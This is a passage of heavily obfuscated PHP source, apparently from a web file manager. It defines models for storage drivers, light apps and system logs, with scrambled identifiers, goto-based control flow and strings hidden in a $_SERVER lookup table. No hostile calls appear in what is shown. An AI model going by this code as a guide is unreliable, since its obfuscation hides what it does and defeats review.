"\144\x65\x66\x61\165\x6c\x74", "\144\162\x69\166\x65\162", "\143\x6f\156\146\x69\147"); public function listData($e÷¥Á²‘¯ª = false, $FùêäÌÈ»ì = "\155\x6f\144\x69\x66\x79\124\151\155\x65", $Aä¼ÌÊ¤ = false) { goto BÍ¤¯ëËáÄ; D”¬ó³Û“Ï: foreach ($CŠ»«¬¥È© as $EÇ¿‚®â•Æ => $FÕ…¦×Ü¡) { unset($CŠ»«¬¥È©[$EÇ¿‚®â•Æ][$eßõæ¯ƒ•‹[6]]); $CŠ»«¬¥È©[$EÇ¿‚®â•Æ][$eßõæ¯ƒ•‹[2099]] = 0; } $Bé…áÅÄÌ§ = array_to_keyvalue($CŠ»«¬¥È©, $eßõæ¯ƒ•‹[33], $eßõæ¯ƒ•‹[367]); $this->_listAppendSize($CŠ»«¬¥È©, $Bé…áÅÄÌ§); goto Bé¼í³Ú„; BÍ¤¯ëËáÄ: $eßõæ¯ƒ•‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CŠ»«¬¥È© = parent::listData($e÷¥Á²‘¯ª, $FùêäÌÈ»ì, $Aä¼ÌÊ¤); if ($e÷¥Á²‘¯ª) { return $CŠ»«¬¥È©; } goto D”¬ó³Û“Ï; Bé¼í³Ú„: return $CŠ»«¬¥È©; goto a¸ëáì®„; a¸ëáì®„: } public function _listAppendSize(&$bÙ×¾ò…¥›, $e–¾âæ÷„ë) { $E‰æ £À…Û =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$e–¾âæ÷„ë) { return; } $cïã’¤¢ = $E‰æ £À…Û[2377] . implode($E‰æ £À…Û[47], $e–¾âæ÷„ë) . $E‰æ £À…Û[2378]; $bĞö…À²Ï• = Model($E‰æ £À…Û[722])->query($cïã’¤¢); $bĞö…À²Ï• = array_to_keyvalue($bĞö…À²Ï•, $E‰æ £À…Û[367], $E‰æ £À…Û[77]); foreach ($bÙ×¾ò…¥› as $E¾ğ†éŞ  => $B‘¸‰ª‡óÒ) { $bÙ×¾ò…¥›[$E¾ğ†éŞ ][$E‰æ £À…Û[2099]] = isset($bĞö…À²Ï•[$B‘¸‰ª‡óÒ[$E‰æ £À…Û[367]]]) ? $bĞö…À²Ï•[$B‘¸‰ª‡óÒ[$E‰æ £À…Û[367]]] : 0; } } public function getConfig($e¢ƒ¢íè„”) { $B£ÀŒƒ¨Ë‚ = parent::listData($e¢ƒ¢íè„”); return json_decode($B£ÀŒƒ¨Ë‚[$_SERVER[³‘’¼äÑ™ÔÍ][6]], !0); } public function update($CØß”«Óˆé, $DÆ´÷•ô¦÷) { goto dñ· øªˆ§; dñ· øªˆ§: $FÕøŸè„Şæ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e¡¿Ì™õì… = $DÆ´÷•ô¦÷[$FÕøŸè„Şæ[28]]; $aÃ¢ìïœ½ª = array_to_keyvalue(parent::listData(), $FÕøŸè„Şæ[28]); goto A’•±ÛØ¾ë; d–‚Å‡ìñ: $A¹ĞÔœó í = parent::update($CØß”«Óˆé, $DÆ´÷•ô¦÷); if ($A¹ĞÔœó í && $DÆ´÷•ô¦÷[$FÕøŸè„Şæ[34]]) { foreach ($aÃ¢ìïœ½ª as $E£’ÌÀ™‘È) { if ($E£’ÌÀ™‘È[$FÕøŸè„Şæ[34]] && $E£’ÌÀ™‘È[$FÕøŸè„Şæ[367]] != $CØß”«Óˆé) { parent::update($E£’ÌÀ™‘È[$FÕøŸè„Şæ[367]], array($FÕøŸè„Şæ[34] => 0)); } } } return $A¹ĞÔœó í; goto dÃâˆ£¶ğĞ; A’•±ÛØ¾ë: if (isset($aÃ¢ìïœ½ª[$e¡¿Ì™õì…]) && $aÃ¢ìïœ½ª[$e¡¿Ì™õì…][$FÕøŸè„Şæ[367]] != $CØß”«Óˆé) { return !1; } if (isset($DÆ´÷•ô¦÷[$FÕøŸè„Şæ[2379]]) && $DÆ´÷•ô¦÷[$FÕøŸè„Şæ[2379]] == $FÕøŸè„Şæ[83]) { $this->checkConfig($DÆ´÷•ô¦÷); } unset($DÆ´÷•ô¦÷[$FÕøŸè„Şæ[2379]]); goto d–‚Å‡ìñ; dÃâˆ£¶ğĞ: } public function add($bî³ãÅŞ·‚) { goto b„¼ôİêéõ; f¶Šğ˜ì…ƒ: $this->checkConfig($bî³ãÅŞ·‚); $aêîŠáŒµê = parent::insert($bî³ãÅŞ·‚); if ($aêîŠáŒµê && $bî³ãÅŞ·‚[$e‹ò¯­Ì‚[34]]) { foreach ($CĞç¿õÔ as $AÔíßÓ‡²Ÿ) { if ($AÔíßÓ‡²Ÿ[$e‹ò¯­Ì‚[34]]) { parent::update($AÔíßÓ‡²Ÿ[$e‹ò¯­Ì‚[367]], array($e‹ò¯­Ì‚[34] => 0)); } } } goto f²š¯ˆˆ³; f²š¯ˆˆ³: return $aêîŠáŒµê; goto B÷ïİÊéöã; b„¼ôİêéõ: $e‹ò¯­Ì‚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CĞç¿õÔ = array_to_keyvalue(parent::listData(), $e‹ò¯­Ì‚[28]); if (isset($CĞç¿õÔ[$bî³ãÅŞ·‚[$e‹ò¯­Ì‚[28]]])) { return !1; } goto f¶Šğ˜ì…ƒ; B÷ïİÊéöã: } public function checkConfig(&$B‰ëá×»ãé) { goto Cº±’µ‰¶ç; F»èÙƒ‹¶ù: $C¥ùĞ³ˆè÷ = $FŠ¾Ò†³¡¡[71] . $f˜ÅÆ„˜í; $eÛä‚ˆĞ¯Î = new $C¥ùĞ³ˆè÷($cïèŠšƒÂ); if (in_array($cÖóœ³ºã®, $eÛä‚ˆĞ¯Î->objectDriver)) { if (!$eÛä‚ˆĞ¯Î->isBucketCors() && !$eÛä‚ˆĞ¯Î->setBucketCors()) { $A¶âß¨ŠÜ = LNG($FŠ¾Ò†³¡¡[2381]); $A¶âß¨ŠÜ .= $FŠ¾Ò†³¡¡[2382] . LNG($FŠ¾Ò†³¡¡[2383]); show_json($A¶âß¨ŠÜ, !1); } } goto E›‘‘Íæ³Š; E›‘‘Íæ³Š: $C—‚Å‹–¬Š = rtrim($cïèŠšƒÂ[$FŠ¾Ò†³¡¡[1028]], $FŠ¾Ò†³¡¡[8]) . $FŠ¾Ò†³¡¡[8]; $A¬ŠÁš¼ù = $eÛä‚ˆĞ¯Î->getPath($C—‚Å‹–¬Š . $FŠ¾Ò†³¡¡[1994]); if (!$eÛä‚ˆĞ¯Î->mkfile($A¬ŠÁš¼ù)) { show_json(LNG($FŠ¾Ò†³¡¡[2381]), !1); } goto E¤Ÿ°Êé†à; cğ† –ŠÂ: return !0; goto Cœ—Ù‚©«ê; Cº±’µ‰¶ç: $FŠ¾Ò†³¡¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cÖóœ³ºã® = strtolower($B‰ëá×»ãé[$FŠ¾Ò†³¡¡[90]]); $cïèŠšƒÂ = json_decode($B‰ëá×»ãé[$FŠ¾Ò†³¡¡[6]], !0); goto aˆ‚‘Ú®³Ì; aˆ‚‘Ú®³Ì: foreach ($cïèŠšƒÂ as $c§¨±ï‘’ => $a¿›âÜæ¸ã) { $cïèŠšƒÂ[$c§¨±ï‘’] = trim($a¿›âÜæ¸ã); } $cïèŠšƒÂ[$FŠ¾Ò†³¡¡[2380]] = rand_string(6); $f˜ÅÆ„˜í = $this->driverType($cÖóœ³ºã®); goto F»èÙƒ‹¶ù; E¤Ÿ°Êé†à: $cïèŠšƒÂ[$FŠ¾Ò†³¡¡[1028]] = $C—‚Å‹–¬Š; $B‰ëá×»ãé[$FŠ¾Ò†³¡¡[6]] = json_encode($cïèŠšƒÂ); $B‰ëá×»ãé[$FŠ¾Ò†³¡¡[90]] = $f˜ÅÆ„˜í; goto cğ† –ŠÂ; Cœ—Ù‚©«ê: } private function driverType($C“Ê“¸·­…) { $e˜µ²ÑŠ„‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eÛòô•ˆÍ· = array($e˜µ²ÑŠ„‰[102] => $e˜µ²ÑŠ„‰[2384], $e˜µ²ÑŠ„‰[58] => $e˜µ²ÑŠ„‰[2385], $e˜µ²ÑŠ„‰[64] => $e˜µ²ÑŠ„‰[2386]); if (isset($eÛòô•ˆÍ·[$C“Ê“¸·­…])) { return $eÛòô•ˆÍ·[$C“Ê“¸·­…]; } return strtoupper($C“Ê“¸·­…); } public function driverListSystem() { $D©°¸”¦¦» =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÅ¼÷˜‚…ƒ = parent::listData(); $f¿ÄÏÍ™À˜ = array(); foreach ($aÅ¼÷˜‚…ƒ as $eÁ¹à¦Ş‹¿) { unset($eÁ¹à¦Ş‹¿[$D©°¸”¦¦»[187]], $eÁ¹à¦Ş‹¿[$D©°¸”¦¦»[107]]); $eÁ¹à¦Ş‹¿[$D©°¸”¦¦»[6]] = json_decode($eÁ¹à¦Ş‹¿[$D©°¸”¦¦»[6]], !0); $f¿ÄÏÍ™À˜[] = $eÁ¹à¦Ş‹¿; } return $f¿ÄÏÍ™À˜; } public function defaultDriver() { $fèÅõàø¯ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÂÄ”®¸í„ = parent::listData(); $e²¶àÜëÉ¼ = array_filter_by_field($AÂÄ”®¸í„, $fèÅõàø¯[34], 1); $e²¶àÜëÉ¼ = $e²¶àÜëÉ¼[0]; if ($e²¶àÜëÉ¼) { $e²¶àÜëÉ¼[$fèÅõàø¯[6]] = json_decode($e²¶àÜëÉ¼[$fèÅõàø¯[6]], !0); } return $e²¶àÜëÉ¼; } public function driverInfo($FÒ¢ÁºÅ¿Ê) { $e îÎŠÈµÓ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÅ©ôí«Ô = array_to_keyvalue(parent::listData(), $e îÎŠÈµÓ[367]); if (!isset($fÅ©ôí«Ô[$FÒ¢ÁºÅ¿Ê])) { return !1; } $b¦¢µ­ÇÄ = $fÅ©ôí«Ô[$FÒ¢ÁºÅ¿Ê]; $b¦¢µ­ÇÄ[$e îÎŠÈµÓ[6]] = json_decode($b¦¢µ­ÇÄ[$e îÎŠÈµÓ[6]], !0); return $b¦¢µ­ÇÄ; } public function remove($dÅÇô©Œ†Ä) { $this->removeShareItems($dÅÇô©Œ†Ä); return parent::remove($dÅÇô©Œ†Ä); } public function removeWithFile($e‘…èé™À–) { goto bŸÒ®œ‡¸¬; bŸÒ®œ‡¸¬: $D±”°ÌœÌŠ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C…Áä†ÛÈ = array($D±”°ÌœÌŠ[747] => $e‘…èé™À–); $e˜‚²‹¿‰ = Model($D±”°ÌœÌŠ[422])->where($C…Áä†ÛÈ)->count(); goto B™çÒÓ¢­; C¹ôˆèŒÓ: $c¸†ìÍÚàÇ->task[$D±”°ÌœÌŠ[701]] = (double) $B´¤Úˆ‚©; $dÚõ÷È„â³ = KodIO::defaultDriver(); $a±ƒ“æÇÅ = $dÚõ÷È„â³[$D±”°ÌœÌŠ[367]]; goto bò°Ü‘¾çß; B™çÒÓ¢­: $B´¤Úˆ‚© = Model($D±”°ÌœÌŠ[422])->where($C…Áä†ÛÈ)->sum($D±”°ÌœÌŠ[77]); $dŒÓ—¥äÌ = $D±”°ÌœÌŠ[2387] . $e‘…èé™À–; $c¸†ìÍÚàÇ = new TaskFileTransfer($dŒÓ—¥äÌ, $D±”°ÌœÌŠ[2388], $e˜‚²‹¿‰, LNG($D±”°ÌœÌŠ[2389]) . "\50{$e‘…èé™À–}\x29"); goto C¹ôˆèŒÓ; bò°Ü‘¾çß: $BØâñ¾Œ® = "\x7b\151\x6f\72{$a±ƒ“æÇÅ}\175\57"; $CÍ‘¯›– = !0; $CŸ÷£ğˆá = array(); goto AÀÈá°ĞŒ‰; AÀÈá°ĞŒ‰: $E³ÎÇ„’‹õ = Model($D±”°ÌœÌŠ[167])->where($C…Áä†ÛÈ)->field($D±”°ÌœÌŠ[2390])->select(); foreach ($E³ÎÇ„’‹õ as $Bã›šëÖôÏ) { goto fÈ­×èÎé˜; fÈ­×èÎé˜: $a—ÑØ÷¹¯¾ = $Bã›šëÖôÏ[$D±”°ÌœÌŠ[75]]; $d¡‹Ÿ¬Ì„˜ = $BØâñ¾Œ® . str_replace("\173\151\x6f\72{$e‘…èé™À–}\x7d\x2f", $D±”°ÌœÌŠ[33], $a—ÑØ÷¹¯¾); if (!IO::exist($a—ÑØ÷¹¯¾)) { $CŸ÷£ğˆá[] = $Bã›šëÖôÏ[$D±”°ÌœÌŠ[419]]; $c¸†ìÍÚàÇ->updateFileEnd($Bã›šëÖôÏ[$D±”°ÌœÌŠ[28]], $Bã›šëÖôÏ[$D±”°ÌœÌŠ[77]]); continue; } goto e±Ï‚ŠÂ‹£; e±Ï‚ŠÂ‹£: if (IO::exist($d¡‹Ÿ¬Ì„˜)) { $c¸†ìÍÚàÇ->updateFileEnd($Bã›šëÖôÏ[$D±”°ÌœÌŠ[28]], $Bã›šëÖôÏ[$D±”°ÌœÌŠ[77]]); continue; } if (!IO::move($a—ÑØ÷¹¯¾, get_path_father($d¡‹Ÿ¬Ì„˜))) { $CÍ‘¯›– = !1; break; } $C…Áä†ÛÈ = array($D±”°ÌœÌŠ[419] => $Bã›šëÖôÏ[$D±”°ÌœÌŠ[419]]); goto a·–ÑßÔ; a·–ÑßÔ: $a«ïÑìå = array($D±”°ÌœÌŠ[747] => $a±ƒ“æÇÅ, $D±”°ÌœÌŠ[75] => $d¡‹Ÿ¬Ì„˜); Model($D±”°ÌœÌŠ[167])->where($C…Áä†ÛÈ)->save($a«ïÑìå); goto bçÊæ†©—±; bçÊæ†©—±: } $this->removeByFileID($CŸ÷£ğˆá); goto CÀ®öÜäó; CÀ®öÜäó: if (!$CÍ‘¯›–) { $c¸†ìÍÚàÇ->stop($dŒÓ—¥äÌ); return !1; } $c¸†ìÍÚàÇ->end(); $this->remove($e‘…èé™À–); goto F£ÏÄ™ªÛ; F£ÏÄ™ªÛ: } public function progress($DçãÛÄÓö·) { return Task::get($_SERVER[³‘’¼äÑ™ÔÍ][2387] . $DçãÛÄÓö·); } private function removeByFileID($Aªª‰“Î£ = array()) { goto AèåÒ—Å›; AèåÒ—Å›: $F£¤ÁôÍŠ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($Aªª‰“Î£)) { return; } $FµŒËáÒÕ = array($F£¤ÁôÍŠ[419] => array($F£¤ÁôÍŠ[7], $Aªª‰“Î£)); goto c˜›Ö†©; c˜›Ö†©: $eœÖßç°„Œ = Model($F£¤ÁôÍŠ[1121])->where($FµŒËáÒÕ)->field($F£¤ÁôÍŠ[369])->select(); if (!$eœÖßç°„Œ) { return; } $eœÖßç°„Œ = array_to_keyvalue($eœÖßç°„Œ, $F£¤ÁôÍŠ[33], $F£¤ÁôÍŠ[369]); goto Dß×¦µ‚Å; Dß×¦µ‚Å: foreach ($eœÖßç°„Œ as $Aî†ñÎËŒ) { Model($F£¤ÁôÍŠ[382])->removeNow($Aî†ñÎËŒ, !1); } goto CøÃÈ¤›ôƒ; CøÃÈ¤›ôƒ: } private function removeShareItems($d½¹²¾¹) { goto b’¦Ù¯¶õÂ; A¯î—¬“…: $Aƒ”¤‹· = Model($cÙŒéëó¼[2090])->where($Dó‰¼°³Ç¿)->field($cÙŒéëó¼[441])->select(); if (empty($Aƒ”¤‹·)) { return; } $EÅ›„ïî = array_to_keyvalue($Aƒ”¤‹·, $cÙŒéëó¼[33], $cÙŒéëó¼[441]); goto D¹¯ä˜±·ñ; b’¦Ù¯¶õÂ: $cÙŒéëó¼ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dëß½ÂÓÖ‰ = "\x7b\x69\157\72{$d½¹²¾¹}\x7d\57"; $Dó‰¼°³Ç¿ = array($cÙŒéëó¼[369] => 0, $cÙŒéëó¼[1023] => array($cÙŒéëó¼[755], "{$dëß½ÂÓÖ‰}\x25")); goto A¯î—¬“…; D¹¯ä˜±·ñ: Model($cÙŒéëó¼[536])->remove($EÅ›„ïî); goto fİä ï¤§×; fİä ï¤§×: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\114\151\147\150\x74\x41\160\x70"; public $modelType = "\123\171\x73\164\x65\155\117\160\164\x69\x6f\x6e"; public $field = array("\x6e\x61\155\145", "\x67\162\157\x75\x70", "\144\x65\163\143", "\x63\x6f\x6e\164\x65\x6e\x74"); public function listData($A›¥½Å¼­ = false, $eÑÒŸçğ = "\x6d\157\x64\x69\x66\x79\124\x69\155\x65", $E›‘»ÜÉƒ° = true) { return parent::listData($A›¥½Å¼­, $eÑÒŸçğ, $E›‘»ÜÉƒ°); } public function remove($fë¼¯šµÃì) { $DŞ«óñ÷É = $this->findByName($fë¼¯šµÃì); if (!$DŞ«óñ÷É) { return !1; } return parent::remove($DŞ«óñ÷É[$_SERVER[³‘’¼äÑ™ÔÍ][367]]); } public function add($e´¹ç™³Š¨) { if ($this->findByName($e´¹ç™³Š¨[$_SERVER[³‘’¼äÑ™ÔÍ][28]])) { return !1; } return parent::insert($e´¹ç™³Š¨); } public function update($A¬‡ìµòŠ“, $d¶ˆÁ æšÆ) { $cŒøğÖŸô =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CÆ¯”ˆº¨ˆ = $this->findByName($A¬‡ìµòŠ“); $AĞâ½ÅäÜ = $this->findByName($d¶ˆÁ æšÆ[$cŒøğÖŸô[28]]); if (!$CÆ¯”ˆº¨ˆ || $AĞâ½ÅäÜ && $AĞâ½ÅäÜ[$cŒøğÖŸô[367]] != $CÆ¯”ˆº¨ˆ[$cŒøğÖŸô[367]]) { return !1; } return parent::update($CÆ¯”ˆº¨ˆ[$cŒøğÖŸô[367]], $d¶ˆÁ æšÆ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\155\137\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\x69\155\x65", "\x74\x69\x6d\x65", "\151\156\163\x65\162\x74", "\146\165\x6e\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $fì¥ŞÊ”“ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return array($fì¥ŞÊ”“[2391] => LNG($fì¥ŞÊ”“[2392]), $fì¥ŞÊ”“[2393] => LNG($fì¥ŞÊ”“[2394]), $fì¥ŞÊ”“[2052] => LNG($fì¥ŞÊ”“[2395]), $fì¥ŞÊ”“[2396] => LNG($fì¥ŞÊ”“[2397]), $fì¥ŞÊ”“[2398] => LNG($fì¥ŞÊ”“[2399]), $fì¥ŞÊ”“[2400] => LNG($fì¥ŞÊ”“[2401]), $fì¥ŞÊ”“[2402] => LNG($fì¥ŞÊ”“[2403]), $fì¥ŞÊ”“[2404] => LNG($fì¥ŞÊ”“[2405]), $fì¥ŞÊ”“[2083] => LNG($fì¥ŞÊ”“[2406]), $fì¥ŞÊ”“[2084] => LNG($fì¥ŞÊ”“[2407]), $fì¥ŞÊ”“[2408] => LNG($fì¥ŞÊ”“[2409]), $fì¥ŞÊ”“[2410] => LNG($fì¥ŞÊ”“[2411]), $fì¥ŞÊ”“[2412] => LNG($fì¥ŞÊ”“[2413]), $fì¥ŞÊ”“[2414] => LNG($fì¥ŞÊ”“[2415]), $fì¥ŞÊ”“[2081] => LNG($fì¥ŞÊ”“[2416]), $fì¥ŞÊ”“[2088] => LNG($fì¥ŞÊ”“[2417]), $fì¥ŞÊ”“[2418] => LNG($fì¥ŞÊ”“[2419]), $fì¥ŞÊ”“[2420] => LNG($fì¥ŞÊ”“[2421]), $fì¥ŞÊ”“[2422] => LNG($fì¥ŞÊ”“[2423]), $fì¥ŞÊ”“[2424] => LNG($fì¥ŞÊ”“[2425]), $fì¥ŞÊ”“[2091] => LNG($fì¥ŞÊ”“[2426]), $fì¥ŞÊ”“[2092] => LNG($fì¥ŞÊ”“[2427]), $fì¥ŞÊ”“[2428] => LNG($fì¥ŞÊ”“[2429]), $fì¥ŞÊ”“[2430] => LNG($fì¥ŞÊ”“[2431]), $fì¥ŞÊ”“[2432] => LNG($fì¥ŞÊ”“[2433]), $fì¥ŞÊ”“[2086] => LNG($fì¥ŞÊ”“[2434]), $fì¥ŞÊ”“[2435] => LNG($fì¥ŞÊ”“[2436]), $fì¥ŞÊ”“[2085] => LNG($fì¥ŞÊ”“[2437]), $fì¥ŞÊ”“[2438] => LNG($fì¥ŞÊ”“[2439]), $fì¥ŞÊ”“[2440] => LNG($fì¥ŞÊ”“[2441]), $fì¥ŞÊ”“[2442] => LNG($fì¥ŞÊ”“[2442]), $fì¥ŞÊ”“[2443] => LNG($fì¥ŞÊ”“[2056]), $fì¥ŞÊ”“[2444] => LNG($fì¥ŞÊ”“[2445]), $fì¥ŞÊ”“[2446] => LNG($fì¥ŞÊ”“[2447]), $fì¥ŞÊ”“[2448] => LNG($fì¥ŞÊ”“[2449]), $fì¥ŞÊ”“[2450] => LNG($fì¥ŞÊ”“[2451]), $fì¥ŞÊ”“[2452] => LNG($fì¥ŞÊ”“[2453]), $fì¥ŞÊ”“[2454] => LNG($fì¥ŞÊ”“[2454]), $fì¥ŞÊ”“[2455] => LNG($fì¥ŞÊ”“[2456]), $fì¥ŞÊ”“[2457] => LNG($fì¥ŞÊ”“[2458]), $fì¥ŞÊ”“[2459] => LNG($fì¥ŞÊ”“[2460]), $fì¥ŞÊ”“[2461] => LNG($fì¥ŞÊ”“[2462]), $fì¥ŞÊ”“[2463] => LNG($fì¥ŞÊ”“[2464]), $fì¥ŞÊ”“[2465] => LNG($fì¥ŞÊ”“[2466])); } private function typeFile() { $C™ïé¿© =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e­”±ùóë† = array($C™ïé¿©[2088] => array($C™ïé¿©[2089]), $C™ïé¿©[2412] => array($C™ïé¿©[2467]), $C™ïé¿©[2414] => array($C™ïé¿©[2468]), $C™ïé¿©[2081] => array($C™ïé¿©[2082]), $C™ïé¿©[2420] => array(), $C™ïé¿©[2422] => array(), $C™ïé¿©[2424] => array(), $C™ïé¿©[2091] => array($C™ïé¿©[2093]), $C™ïé¿©[2092] => array($C™ïé¿©[2093]), $C™ïé¿©[2428] => array($C™ïé¿©[2469]), $C™ïé¿©[2430] => array($C™ïé¿©[2469]), $C™ïé¿©[2432] => array($C™ïé¿©[2470]), $C™ïé¿©[2418] => array($C™ïé¿©[2471]), $C™ïé¿©[2086] => array($C™ïé¿©[2472]), $C™ïé¿©[2435] => array($C™ïé¿©[2473]), $C™ïé¿©[2085] => array($C™ïé¿©[2087])); return $e­”±ùóë†; } private function typeAll() { goto c£ƒµôóØ; B˜È³ïó: return $Aêƒö­ƒ‹É; goto f¸çŸÜğİ»; dîÛ‹¢š£Ö: foreach ($CŠ ‹ØšªË as $EëêŠ„Š“Œ => $BêŞÂº¸Èø) { $Aêƒö­ƒ‹É[$BêŞÂº¸Èø[0]] = $Aêƒö­ƒ‹É[$EëêŠ„Š“Œ]; } $Aêƒö­ƒ‹É[$CÊ™ìô¥‹’[2093]] = LNG($CÊ™ìô¥‹’[2474]); $Aêƒö­ƒ‹É[$CÊ™ìô¥‹’[2469]] = LNG($CÊ™ìô¥‹’[2475]); goto B˜È³ïó; c£ƒµôóØ: $CÊ™ìô¥‹’ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Aêƒö­ƒ‹É = $this->typeList; $CŠ ‹ØšªË = array_filter($this->typeFile()); goto dîÛ‹¢š£Ö; f¸çŸÜğİ»: } public function addLog($FÒÇç¤‰ÏÉ, $CºçáöäÔ = array()) { goto D‹Ñ¬‹Åô¹; D‹Ñ¬‹Åô¹: $Fİ°Úè’ªó =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($this->typeList[$FÒÇç¤‰ÏÉ])) { return; } $cé»†ù³ò£ = USER_ID ? USER_ID : (isset($CºçáöäÔ[$Fİ°Úè’ªó[1445]]) ? $CºçáöäÔ[$Fİ°Úè’ªó[1445]] : 0); goto BĞª†Ó¯éè; BĞª†Ó¯éè: $C»Ê³…¡¶í = get_client_ip(); if (!$CºçáöäÔ || strlen(json_encode($CºçáöäÔ)) >= 1024) { $CºçáöäÔ = array($Fİ°Úè’ªó[2476] => $C»Ê³…¡¶í); } else { if (is_array($CºçáöäÔ)) { $CºçáöäÔ[$Fİ°Úè’ªó[2476]] = $C»Ê³…¡¶í; } else { $CºçáöäÔ = array($Fİ°Úè’ªó[1038] => $CºçáöäÔ, $Fİ°Úè’ªó[2476] => $C»Ê³…¡¶í); } } $CºçáöäÔ = array($Fİ°Úè’ªó[1435] => Session::sign(), $Fİ°Úè’ªó[1436] => $cé»†ù³ò£, $Fİ°Úè’ªó[29] => $FÒÇç¤‰ÏÉ, $Fİ°Úè’ªó[1438] => json_encode($CºçáöäÔ)); goto A‹Í‰‹æêê; A‹Í‰‹æêê: parent::add($CºçáöäÔ); goto cœÛö—İ; cœÛö—İ: } public function remove($F°å£›¾æĞ) { $this->where(array($_SERVER[³‘’¼äÑ™ÔÍ][385] => $F°å£›¾æĞ))->delete(); } private function _makeOrder($bÕ‹Ìİ»ƒ„ = '') { goto BÃ„«ÎĞ‡; BÃ„«ÎĞ‡: $DÉ—²¦íòÃ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AêŒ¦‘ æº = $DÉ—²¦íòÃ[187]; $A ç·åÏá’ = array($DÉ—²¦íòÃ[402] => $DÉ—²¦íòÃ[403], $DÉ—²¦íòÃ[404] => $DÉ—²¦íòÃ[405]); goto bÎÁ’‘ƒÔº; bÎÁ’‘ƒÔº: $E¿Ï±™Â÷ = Input::get($DÉ—²¦íòÃ[408], $DÉ—²¦íòÃ[7], $DÉ—²¦íòÃ[2254], array($DÉ—²¦íòÃ[2190], $DÉ—²¦íòÃ[404])); $E¿Ï±™Â÷ = $A ç·åÏá’[$E¿Ï±™Â÷]; $bÕ‹Ìİ»ƒ„ = $bÕ‹Ìİ»ƒ„ . "{$AêŒ¦‘ æº}\40{$E¿Ï±™Â÷}"; goto A›ë•¶÷«; A›ë•¶÷«: return $this->order($bÕ‹Ìİ»ƒ„); goto D‰°Ğµœ‰Ğ; D‰°Ğµœ‰Ğ: } public function get($eå×ê£¹Ã” = '') { goto A»Â¦é‚š; fÂ×ë“Éƒ: $F äê„‰¥…[$c–³§ÜŸ…Ï[354]] = $this->logList($F äê„‰¥…[$c–³§ÜŸ…Ï[354]]); return $F äê„‰¥…; goto Eø¨¹ê‹…¼; A»Â¦é‚š: $c–³§ÜŸ…Ï =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$eå×ê£¹Ã”) { show_json(array()); } $CÁùèƒòÎ = array(); goto C”³¿‡…®â; B²×ª¼ªŸâ: if (!empty($eå×ê£¹Ã”[$c–³§ÜŸ…Ï[2476]])) { $CÁùèƒòÎ[$c–³§ÜŸ…Ï[405]] = array($c–³§ÜŸ…Ï[755], "\x25{$eå×ê£¹Ã”[$c–³§ÜŸ…Ï[2476]]}\45"); } $F äê„‰¥… = $this->_makeOrder()->where($CÁùèƒòÎ)->selectPage(); if (empty($F äê„‰¥…[$c–³§ÜŸ…Ï[354]])) { show_json(array(), !0, $F äê„‰¥…[$c–³§ÜŸ…Ï[351]]); } goto fÂ×ë“Éƒ; C”³¿‡…®â: if ($eå×ê£¹Ã”[$c–³§ÜŸ…Ï[1445]]) { $CÁùèƒòÎ[$c–³§ÜŸ…Ï[1445]] = $eå×ê£¹Ã”[$c–³§ÜŸ…Ï[1445]]; } if (isset($eå×ê£¹Ã”[$c–³§ÜŸ…Ï[705]])) { $eÎßÃÜº = $eå×ê£¹Ã”[$c–³§ÜŸ…Ï[705]]; $bËÅÍ¡¡Óˆ = isset($eå×ê£¹Ã”[$c–³§ÜŸ…Ï[706]]) ? $eå×ê£¹Ã”[$c–³§ÜŸ…Ï[706]] : time(); $CÁùèƒòÎ[$c–³§ÜŸ…Ï[187]] = array($c–³§ÜŸ…Ï[321], array($eÎßÃÜº, $bËÅÍ¡¡Óˆ)); } if ($eå×ê£¹Ã”[$c–³§ÜŸ…Ï[29]]) { $fŠù¢ôÇ› = explode($c–³§ÜŸ…Ï[47], $eå×ê£¹Ã”[$c–³§ÜŸ…Ï[29]]); $Bîê½œ™µ = $this->typeFile(); $aòâÂƒêôˆ = array(); foreach ($fŠù¢ôÇ› as $Aë¼ÒŒí ²) { $aòâÂƒêôˆ[] = $Aë¼ÒŒí ²; if (isset($Bîê½œ™µ[$Aë¼ÒŒí ²])) { $aòâÂƒêôˆ = array_merge($aòâÂƒêôˆ, $Bîê½œ™µ[$Aë¼ÒŒí ²]); } } $aòâÂƒêôˆ = array_unique($aòâÂƒêôˆ); if ($aòâÂƒêôˆ) { $CÁùèƒòÎ[$c–³§ÜŸ…Ï[29]] = array($c–³§ÜŸ…Ï[7], $aòâÂƒêôˆ); } } goto B²×ª¼ªŸâ; Eø¨¹ê‹…¼: } private function ipAddress(&$c½®îº»Ï) { $FñÒéÑÆµ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!empty($c½®îº»Ï[$FñÒéÑÆµ[2476]])) { $F¦…ø‰Øƒ = IpLocation::get($c½®îº»Ï[$FñÒéÑÆµ[2476]]); } else { $F¦…ø‰Øƒ = LNG($FñÒéÑÆµ[2477]); } $c½®îº»Ï[$FñÒéÑÆµ[2478]] = $F¦…ø‰Øƒ; } private function descZipDownload($bš·ßë¯èª, &$cù—¡Ç•‹ˆ) { $b¢„Ì·ùÆ¯ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($bš·ßë¯èª[$b¢„Ì·ùÆ¯[2479]])) { return; } $dÇñ’³¨¶ö = 